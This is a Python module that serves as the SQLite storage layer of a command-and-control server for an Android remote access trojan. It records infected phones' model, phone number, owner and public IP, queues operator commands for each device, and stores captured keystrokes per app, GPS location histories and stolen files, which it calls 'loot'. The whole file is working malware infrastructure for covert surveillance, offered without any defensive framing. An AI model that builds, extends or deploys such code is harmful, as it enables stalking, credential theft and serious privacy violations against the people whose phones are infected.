"""SQLite persistence for the C2: sessions, tasks, events, captured artifacts.

One connection per call keeps this safe to hit from the asyncio loop and from
the operator console thread. WAL is enabled once at init so a long dashboard
read never blocks a beacon write. Everything is parameterised; no SQL is built
from device input.
"""
from __future__ import annotations

import json
import os
import sqlite3
import threading
import time
from typing import Any, Dict, Iterable, List, Optional

from . import protocol

ROOT = os.environ.get("HACKIT_RAT_HOME") or os.path.join(os.path.expanduser("~"), ".hackit", "rat")
DB_PATH = os.path.join(ROOT, "rat.db")
FILES_DIR = os.path.join(ROOT, "loot")

_schema_lock = threading.Lock()
_ready = False

SCHEMA = """
CREATE TABLE IF NOT EXISTS sessions (
    sid         TEXT PRIMARY KEY,
    label       TEXT NOT NULL,
    model       TEXT,
    android     TEXT,
    sdk         INTEGER,
    abi         TEXT,
    phone       TEXT,
    owner       TEXT,
    first_seen  REAL NOT NULL,
    last_seen   REAL NOT NULL,
    pub_ip      TEXT,
    last_op     TEXT,
    battery     INTEGER,
    charging    INTEGER,
    online      INTEGER NOT NULL DEFAULT 1,
    sleep_ms    INTEGER NOT NULL DEFAULT 0,
    kind        TEXT NOT NULL DEFAULT 'apk'
);
CREATE TABLE IF NOT EXISTS tasks (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    sid         TEXT NOT NULL,
    cmd         TEXT NOT NULL,
    args        TEXT NOT NULL,
    state       TEXT NOT NULL DEFAULT 'queued',
    created     REAL NOT NULL,
    delivered   REAL,
    done        REAL,
    exit_code   INTEGER,
    output      TEXT
);
CREATE INDEX IF NOT EXISTS idx_tasks_sid_state ON tasks (sid, state);
CREATE TABLE IF NOT EXISTS events (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    sid         TEXT NOT NULL,
    kind        TEXT NOT NULL,
    body        TEXT NOT NULL,
    ts          REAL NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_events_sid_kind ON events (sid, kind, id);
CREATE TABLE IF NOT EXISTS keylogs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    sid         TEXT NOT NULL,
    package     TEXT,
    text        TEXT,
    ts          REAL NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_keylogs_sid ON keylogs (sid, id);
CREATE TABLE IF NOT EXISTS locations (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    sid         TEXT NOT NULL,
    lat         REAL,
    lon         REAL,
    accuracy    REAL,
    provider    TEXT,
    ts          REAL NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_locations_sid ON locations (sid, id);
CREATE TABLE IF NOT EXISTS loot (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    sid         TEXT NOT NULL,
    name        TEXT NOT NULL,
    path        TEXT NOT NULL,
    size        INTEGER NOT NULL,
    kind        TEXT NOT NULL,
    ts          REAL NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_loot_sid ON loot (sid, id);
"""


def _connect() -> sqlite3.Connection:
    os.makedirs(ROOT, exist_ok=True)
    os.makedirs(FILES_DIR, exist_ok=True)
    conn = sqlite3.connect(DB_PATH, timeout=30.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


MIGRATIONS = {
    "sessions": {"kind": "TEXT NOT NULL DEFAULT 'apk'", "spec": "TEXT NOT NULL DEFAULT 'rat'"},
}


def init() -> None:
    global _ready
    with _schema_lock:
        if _ready:
            return
        conn = _connect()
        try:
            conn.executescript(SCHEMA)
            for table, columns in MIGRATIONS.items():
                have = {row["name"] for row in conn.execute(f"PRAGMA table_info({table})")}
                for name, ddl in columns.items():
                    if name not in have:
                        conn.execute(f"ALTER TABLE {table} ADD COLUMN {name} {ddl}")
            conn.commit()
        finally:
            conn.close()
        _ready = True


def _rows(sql: str, params: Iterable[Any] = ()) -> List[Dict[str, Any]]:
    init()
    conn = _connect()
    try:
        return [dict(r) for r in conn.execute(sql, tuple(params)).fetchall()]
    finally:
        conn.close()


def _exec(sql: str, params: Iterable[Any] = ()) -> int:
    init()
    conn = _connect()
    try:
        cur = conn.execute(sql, tuple(params))
        conn.commit()
        return cur.lastrowid or 0
    finally:
        conn.close()


# ---------------------------------------------------------------- sessions

def register(sid: str, meta: Dict[str, Any], pub_ip: str, kind: str = "apk") -> Dict[str, Any]:
    """Insert or refresh a session. `meta` comes from the device, so every
    field is coerced; unknown keys are ignored rather than stored raw."""
    now = time.time()
    label = str(meta.get("label") or meta.get("model") or sid[:8])[:64]
    spec = str(meta.get("spec") or "rat")[:24]
    sdk = int(meta.get("sdk") or 0) if str(meta.get("sdk") or "0").isdigit() else 0
    _exec(
        """INSERT INTO sessions (sid, label, model, android, sdk, abi, phone, owner,
                                first_seen, last_seen, pub_ip, battery, charging, online, kind, spec)
           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,1,?,?)
           ON CONFLICT(sid) DO UPDATE SET
             last_seen=excluded.last_seen, pub_ip=excluded.pub_ip,
             battery=CASE WHEN excluded.battery > 0 THEN excluded.battery ELSE sessions.battery END,
             charging=excluded.charging, online=1,
             label=COALESCE(NULLIF(sessions.label,''), excluded.label)""",
        (
            sid, label, str(meta.get("model") or "")[:80], str(meta.get("android") or "")[:16],
            sdk, str(meta.get("abi") or "")[:24], str(meta.get("phone") or "")[:24],
            str(meta.get("owner") or "")[:80], now, now, pub_ip,
            _int(meta.get("battery")), _int(meta.get("charging")), kind[:16], spec,
        ),
    )
    return get_session(sid) or {}


def _int(value: Any) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return 0


def touch(sid: str, meta: Optional[Dict[str, Any]] = None, op: Optional[str] = None,
          pub_ip: Optional[str] = None, sleep_ms: Optional[int] = None) -> None:
    sets, params = ["last_seen=?", "online=1"], [time.time()]
    meta = meta or {}
    for col in ("battery", "charging"):
        if col in meta:
            sets.append(f"{col}=?")
            params.append(_int(meta[col]))
    if op:
        sets.append("last_op=?")
        params.append(op[:32])
    if pub_ip:
        sets.append("pub_ip=?")
        params.append(pub_ip[:64])
    if sleep_ms is not None:
        sets.append("sleep_ms=?")
        params.append(max(0, int(sleep_ms)))
    params.append(sid)
    _exec(f"UPDATE sessions SET {', '.join(sets)} WHERE sid=?", params)


def get_session(sid: str) -> Optional[Dict[str, Any]]:
    rows = _rows("SELECT * FROM sessions WHERE sid=?", (sid,))
    return rows[0] if rows else None


def sessions() -> List[Dict[str, Any]]:
    return _rows("SELECT * FROM sessions ORDER BY last_seen DESC")


def drop_session(sid: str) -> None:
    for table in ("tasks", "events", "keylogs", "locations", "loot"):
        _exec(f"DELETE FROM {table} WHERE sid=?", (sid,))
    _exec("DELETE FROM sessions WHERE sid=?", (sid,))


def mark_offline(threshold_s: int) -> int:
    cutoff = time.time() - threshold_s
    init()
    conn = _connect()
    try:
        cur = conn.execute("UPDATE sessions SET online=0 WHERE last_seen < ? AND online=1", (cutoff,))
        conn.commit()
        return cur.rowcount
    finally:
        conn.close()


# ------------------------------------------------------------------- tasks

def queue_task(sid: str, cmd: str, args: Optional[List[str]] = None) -> int:
    task = protocol.validate_task({"cmd": cmd, "args": args or []})
    return _exec(
        "INSERT INTO tasks (sid, cmd, args, created) VALUES (?,?,?,?)",
        (sid, task["cmd"], json.dumps(task["args"]), time.time()),
    )


def take_tasks(sid: str, maximum: int) -> List[Dict[str, Any]]:
    """Atomically hand out queued tasks so a resent beacon never double-runs."""
    init()
    conn = _connect()
    try:
        conn.execute("BEGIN IMMEDIATE")
        rows = conn.execute(
            "SELECT * FROM tasks WHERE sid=? AND state='queued' ORDER BY id LIMIT ?", (sid, maximum)
        ).fetchall()
        now = time.time()
        out = []
        for row in rows:
            conn.execute("UPDATE tasks SET state='delivered', delivered=? WHERE id=?", (now, row["id"]))
            out.append({"id": row["id"], "cmd": row["cmd"], "args": json.loads(row["args"])})
        conn.commit()
        return out
    finally:
        conn.close()


def complete_task(task_id: int, sid: str, output: str, exit_code: int = 0) -> bool:
    init()
    conn = _connect()
    try:
        cur = conn.execute(
            "UPDATE tasks SET state='done', done=?, output=?, exit_code=? "
            "WHERE id=? AND sid=? AND state IN ('queued','delivered')",
            (time.time(), output[:262144], exit_code, task_id, sid),
        )
        conn.commit()
        return cur.rowcount > 0
    finally:
        conn.close()


def requeue_stale(age_s: int) -> int:
    """A tapped but never-answered task (process killed mid-run) goes back."""
    cutoff = time.time() - age_s
    init()
    conn = _connect()
    try:
        cur = conn.execute("UPDATE tasks SET state='queued' WHERE state='delivered' AND delivered < ?", (cutoff,))
        conn.commit()
        return cur.rowcount
    finally:
        conn.close()


def tasks(sid: str, limit: int = 50, state: Optional[str] = None) -> List[Dict[str, Any]]:
    if state:
        return _rows("SELECT * FROM tasks WHERE sid=? AND state=? ORDER BY id DESC LIMIT ?", (sid, state, limit))
    return _rows("SELECT * FROM tasks WHERE sid=? ORDER BY id DESC LIMIT ?", (sid, limit))


def task(task_id: int) -> Optional[Dict[str, Any]]:
    rows = _rows("SELECT * FROM tasks WHERE id=?", (task_id,))
    return rows[0] if rows else None


# ------------------------------------------------------------------ events

def add_event(sid: str, kind: str, body: Any) -> int:
    return _exec(
        "INSERT INTO events (sid, kind, body, ts) VALUES (?,?,?,?)",
        (sid, kind[:32], json.dumps(body, ensure_ascii=False), time.time()),
    )


def events(sid: str, kind: Optional[str] = None, after_id: int = 0, limit: int = 200) -> List[Dict[str, Any]]:
    if kind:
        return _rows(
            "SELECT * FROM events WHERE sid=? AND kind=? AND id>? ORDER BY id LIMIT ?",
            (sid, kind, after_id, limit),
        )
    return _rows("SELECT * FROM events WHERE sid=? AND id>? ORDER BY id LIMIT ?", (sid, after_id, limit))


def add_keylogs(sid: str, rows: List[Dict[str, Any]]) -> int:
    if not rows:
        return 0
    now = time.time()
    init()
    conn = _connect()
    try:
        conn.executemany(
            "INSERT INTO keylogs (sid, package, text, ts) VALUES (?,?,?,?)",
            [(sid, str(r.get("pkg") or "")[:128], str(r.get("text") or "")[:2048], now) for r in rows[:500]],
        )
        conn.commit()
        return len(rows[:500])
    finally:
        conn.close()


def keylogs(sid: str, after_id: int = 0, limit: int = 500) -> List[Dict[str, Any]]:
    return _rows("SELECT * FROM keylogs WHERE sid=? AND id>? ORDER BY id LIMIT ?", (sid, after_id, limit))


def add_locations(sid: str, rows: List[Dict[str, Any]]) -> int:
    if not rows:
        return 0
    now = time.time()
    init()
    conn = _connect()
    try:
        conn.executemany(
            "INSERT INTO locations (sid, lat, lon, accuracy, provider, ts) VALUES (?,?,?,?,?,?)",
            [
                (sid, _float(r.get("lat")), _float(r.get("lon")), _float(r.get("acc")),
                 str(r.get("src") or "")[:16], _float(r.get("ts")) or now)
                for r in rows[:200]
            ],
        )
        conn.commit()
        return len(rows[:200])
    finally:
        conn.close()


def _float(value: Any) -> float:
    try:
        return float(value)
    except (TypeError, ValueError):
        return 0.0


def locations(sid: str, limit: int = 500) -> List[Dict[str, Any]]:
    return _rows("SELECT * FROM locations WHERE sid=? ORDER BY id DESC LIMIT ?", (sid, limit))


# -------------------------------------------------------------------- loot

def add_loot(sid: str, name: str, path: str, size: int, kind: str) -> int:
    return _exec(
        "INSERT INTO loot (sid, name, path, size, kind, ts) VALUES (?,?,?,?,?,?)",
        (sid, name[:200], path, size, kind[:16], time.time()),
    )


def loot(sid: str, limit: int = 200) -> List[Dict[str, Any]]:
    return _rows("SELECT * FROM loot WHERE sid=? ORDER BY id DESC LIMIT ?", (sid, limit))


def stats() -> Dict[str, int]:
    init()
    conn = _connect()
    try:
        return {
            "sessions": conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0],
            "online": conn.execute("SELECT COUNT(*) FROM sessions WHERE online=1").fetchone()[0],
            "events": conn.execute("SELECT COUNT(*) FROM events").fetchone()[0],
            "loot": conn.execute("SELECT COUNT(*) FROM loot").fetchone()[0],
        }
    finally:
        conn.close()
